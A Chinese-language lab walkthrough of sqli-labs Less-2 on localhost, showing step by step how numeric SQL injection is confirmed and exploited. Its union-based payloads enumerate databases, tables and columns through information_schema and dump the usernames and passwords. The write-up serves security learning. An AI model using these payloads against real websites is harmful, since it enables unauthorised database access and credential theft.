字符型的注入和这一小节来说数字型的注入基本上一样。来到第二关，尝试注入确定其报错类型：

+ `http://localhost:63342/WWW/sqli-labs-master/Less-2/index.php?id=1`没有报错，正常回显
+ `http://localhost:63342/WWW/sqli-labs-master/Less-2/index.php?id=1'`语法错误

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641794900387-531bbe7d-bd07-410e-bb64-e838adb12a04.png)

+ `http://localhost:63342/WWW/sqli-labs-master/Less-2/index.php?id=1''`**语法错误**

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641794926103-c6ec135d-d9b9-43e8-8053-debaefadde1d.png)

+ `http://localhost:63342/WWW/sqli-labs-master/Less-2/index.php?id=1 and 1 = 1`没有报错，正常回显
+ `http://localhost:63342/WWW/sqli-labs-master/Less-2/index.php?id=1 and 1 = 2`没有报错，没有回显
+ `http://localhost:63342/WWW/sqli-labs-master/Less-2/index.php?id=1' --+`语法错误

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641795553942-bd4942a6-e73c-4f85-bf20-e46839274d87.png)



和上一关一样，根据回显内容和网页显示内容大致猜测查询语句的结构为：

```sql
select username,password from table_name where id = $_GET['id'] limit 0,1;
```

所以对应查询语句应该为：

1. `select username,password from table_name where id =1' limit 0,1;`
2. `select username,password from table_name where id =1'' limit 0,1;`
3. `select username,password from table_name where id =1 and 1 = 1 limit 0,1;`
4. `select username,password from table_name where id =1 and 1 = 2 limit 0,1;`
5. `select username,password from table_name where id = 1' -- limit 0,1;`

根据上面的内容可以确定为数字型注入，接下来判断这个表中数据有多少列即有多少个字段，可以使用`order by`判断，当`order by 4`时会发生错误：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641795834822-2484ec1d-ecbe-42c9-90d1-4b4fa9cf8ee3.png)

说明这个表中有3个字段。和上一小节一样下面使用由联合查询语句union来判断（不懂原理的可以看上一节）：

`http://localhost:63342/WWW/sqli-labs-master/Less-2/index.php?id=-1 union select 1,2,3 --+`

> `select username,password from table_name where id = -1 union select 1,2,3 -- limit 0,1;`（再次强调这里select的内容未知）
>

可以看一下结果：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641796912983-413c0afe-69dc-4b89-8d0f-d394272dfeae.png)

根据此语句稍微更改即可带出当前的数据库和用户：`select username,password from table_name where id = -1 union select 1,user(),database() -- limit 0,1;`

即：`http://localhost:63342/WWW/sqli-labs-master/Less-2/index.php?id= -1 union select 1,user(),database() --+`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641797173623-56e82aa1-90e8-4ea5-9c2f-76f79c0813f3.png)

查询所有数据库的名称：`?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641797352615-2739625a-f0d7-4259-9177-8384a06f2fd1.png)

查询security数据库中的所有表：`?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641797804810-71c1b826-96e0-464e-a7ee-9a5c583dfe34.png)

然后查询user表中的字段：`?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security' --+`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641801563536-8d86ffef-b56f-4a2d-858b-eced8d672b4e.png)

查询users表中的所有内容：`?id = -1 union select 1,group_concat(username),group_concat(password) from users--+`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641797937971-1e3dfc25-1b4d-469e-a3e5-c603aa1e60f1.png)

完成。

